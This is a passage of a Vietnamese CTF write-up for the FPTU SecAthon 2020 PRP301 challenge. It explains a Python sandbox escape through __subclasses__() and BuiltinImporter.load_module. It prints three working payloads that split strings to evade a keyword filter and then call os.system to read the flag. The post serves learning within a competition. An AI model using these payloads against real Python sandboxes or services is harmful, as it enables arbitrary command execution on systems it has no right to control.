highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;object&gt;.__class_.__mro__[1].__subclasses__()
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97857020-b4dd4300-1d2f-11eb-8fc5-d4729dbf32b6.png" alt="image" /></p><p>Awesome!!!! Đừng thấy nó trông nhiều như thế mà hoa mắt, bởi vì mục tiêu mà ta đang tìm kiếm là một module nào đó có liên quan đến câu lệnh “import”. Sau 1 quá trình google không ngừng, tôi đã tìm ra thứ mình cần đó là package <a href="https://docs.python.org/3/library/importlib.html#module-importlib">importlib</a> (đây chính là implementation của “import”). Nghiên cứu doc của package này tôi phát hiện ra có module <a href="https://docs.python.org/3/library/importlib.html#module-importlib.machinery">machinery</a> chứa các object cần thiết giúp “import” tìm và load các module. Chúng ta đang cần tìm và load các built-in module lên, vậy chắc chắn không có lý do gì ta lại không dùng [BuiltinImporter] - (https://docs.python.org/3/library/importlib.html#importlib.machinery.BuiltinImporter) - một <a href="https://docs.python.org/3/glossary.html#term-importer">importer</a> chuyên dùng cho việc này. Giờ chúng ta chỉ việc CTRL + F và tìm xem importer BuiltinImporter có xuất hiện trong output trả về trên kia không nào:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97877015-2f698b00-1d4f-11eb-8c5b-625126c4cc35.png" alt="image" /></p><p>Cool:))) Mày ở đây rồi!!! Trong array mà <code class="language-plaintext highlighter-rouge">().__class__.__mro__[1].__subclasses__()</code> trả về thì phần tử <code class="language-plaintext highlighter-rouge">&lt;class '_frozen_importlib.BuiltinImporter'&gt;</code> nằm ở vị trí 84 (để biết tại sao nó lại là <code class="language-plaintext highlighter-rouge">class '_frozen_importlib.BuiltinImporter'</code> chứ không phải là <code class="language-plaintext highlighter-rouge">class importlib.machinery.BuiltinImporter</code> bạn có xem tại <a href="https://stackoverflow.com/questions/22378507/globals-frozen-importlib-builtinimporter">đây</a>). Từ class (module) này chúng ta có thể implement <a href="https://docs.python.org/3/library/importlib.html#importlib.abc.InspectLoader" title="importlib.abc.InspectLoader">importlib.abc.InspectLoader</a>, tới đây chúng ta có thể lấy được chìa khóa để kết thúc challenge này, đó là method <a href="https://docs.python.org/3/library/importlib.html#importlib.abc.InspectLoader.load_module">load_module</a> của class “InspectLoader”. Tóm lại, từ những gì thu thập được, các payload cuối cùng dẫn đến flag của tôi là (dùng cái nào cũng đúng hết):</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">return</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">84</span><span class="p">].</span><span class="n">load_module</span><span class="p">(</span><span class="s">'buil'</span><span class="o">+</span><span class="s">'tins'</span><span class="p">).</span><span class="nb">getattr</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">84</span><span class="p">].</span><span class="n">load_module</span><span class="p">(</span><span class="s">'o'</span><span class="o">+</span><span class="s">'s'</span><span class="p">),</span> <span class="s">'sys'</span><span class="o">+</span><span class="s">'tem'</span><span class="p">)(</span><span class="s">"cat flag.txt"</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">return</span> <span class="s">'ConBOTDBGRFromLuaDLM'</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">84</span><span class="p">].</span><span class="n">load_module</span><span class="p">(</span><span class="s">'buil'</span><span class="o">+</span><span class="s">'tins'</span><span class="p">).</span><span class="nb">getattr</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">84</span><span class="p">].</span><span class="n">load_module</span><span class="p">(</span><span class="s">'o'</span><span class="o">+</span><span class="s">'s'</span><span class="p">),</span> <span class="s">'sys'</span><span class="o">+</span><span class="s">'tem'</span><span class="p">)(</span><span class="s">"cat flag.txt"</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">return</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">).</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">84</span><span class="p">].</span><span class="n">load_module</span><span class="p">(</span><span class="s">'buil'</span><span class="o">+</span><span class="s">'tins'</span><span class="p">).</span><span class="nb">getattr</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">84</span><span class="p">].</span><span class="n">load_module</span><span class="p">(</span><span class="s">'o'</span><span class="o">+</span><span class="s">'s'</span><span class="p">),</span> <span class="s">'sys'</span><span class="o">+</span><span class="s">'tem'</span><span class="p">)(</span><span class="s">"cat flag.txt"</span><span class="p">)</span>
</pre></table></code></div></div><p>Cay cú quá, đi thi đếch giải ra, về nhà mới giải ra:(((</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/97881084-86be2a00-1d54-11eb-8e59-2974213cc84b.png" alt="image" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/misc-challenges/'>MISC Challenges</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/misc/" class="post-tag no-text-decoration" >misc</a> <a href="/tags/fusec20/" class="post-tag no-text-decoration" >fusec20</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=FPTU SecAthon 2020 | MISC Writeup | PRP301 - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=FPTU SecAthon 2020 | MISC Writeup | PRP301 - Ethical Hackers Club&u=https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=FPTU SecAthon 2020 | MISC Writeup | PRP301 - Ethical Hackers Club&url=https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h4>Recent Update</h4><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/SVATTT-Crypto/">ASCIS (ASEAN Student Contest on Information Security) 's Cryptography Write-ups</a><li><a href="/posts/SVATTT-Web/">ASCIS (ASEAN Student Contest on Information Security) 's Web Write-ups</a><li><a href="/posts/FuSec3-Forensics/">FPTU SecAthon 2020 | Forensics Writeup | FRS301</a><li><a href="/posts/ACSC2021-Forensics/">Asian Cyber Security Challenge 2021 | Forensics Writeup | Nyong Coin, BitLocker Artifact</a><li><a href="/posts/FuSec4-CRY302-CRY303/">FPTU SecAthon 2021 | Cryptographic Writeup | CRY302 & CRY303</a></ul></div><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h4 class="pl-3 pt-2 mb-2">Contents</h4><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/FuSec3-IAW301-IAW302/"><div class="card-body"> <em class="timeago small" date="2020-10-20 23:36:00 +0700" >Oct 20, 2020</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2020 | Web Writeup | IAW301 & IAW302</h3><div class="text-muted small"><p> IAW301 HINT 2 : http://35.198.195.87:7001/src.zip HINT 4 : “valid/email*“@gmail.com SOLUTION Dựa vào hint 2 ta đọc source và biết ngay vuln tại phần email trong chức năng...</p></div></div></a></div><div class="card"> <a href="/posts/FuSec3-CRY301-CRY302/"><div class="card-body"> <em class="timeago small" date="2020-10-21 15:34:00 +0700" >Oct 21, 2020</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2020 | Cryptographic Writeup | CRY301 & CRY302</h3><div class="text-muted small"><p> This is an annual competition for FPT University students to practice their skills with jeopardy CTF challenges. I was with my team, M1sh13f, and we’re at the #5 place. Congrats me and my amaz...</p></div></div></a></div><div class="card"> <a href="/posts/FuSec3-Forensics/"><div class="card-body"> <em class="timeago small" date="2020-10-21 16:35:00 +0700" >Oct 21, 2020</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FPTU SecAthon 2020 | Forensics Writeup | FRS301</h3><div class="text-muted small"><p> FRS301 Description Download file: link Machine Identification Code Solution Brief Convert the pdf files into images using pdftoppm Use deda to extract informations from images Grep ser...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/XSS-co-ban-CORS-CSP/" class="btn btn-outline-primary" prompt="Older"><p>XSS cơ bản | CORS và CSP</p></a> <a href="/posts/DiceCTF-BabierCSP/" class="btn btn-outline-primary" prompt="Newer"><p>DiceCTF 2021 | Web Writeup | Babier CSP</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/FPTU-Ethical-Hackers-Club">FPTU Ethical Hackers' Club</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><h4 class="text-muted">Trending Tags</h4><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/wiki/">wiki</a> <a class="post-tag" href="/tags/fusec21/">fusec21</a> <a class="post-tag" href="/tags/cryptographic/">cryptographic</a> <a class="post-tag" href="/tags/fusec20/">fusec20</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/acsc21/">acsc21</a> <a class="post-tag" href="/tags/svattt2021/">SVATTT2021</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
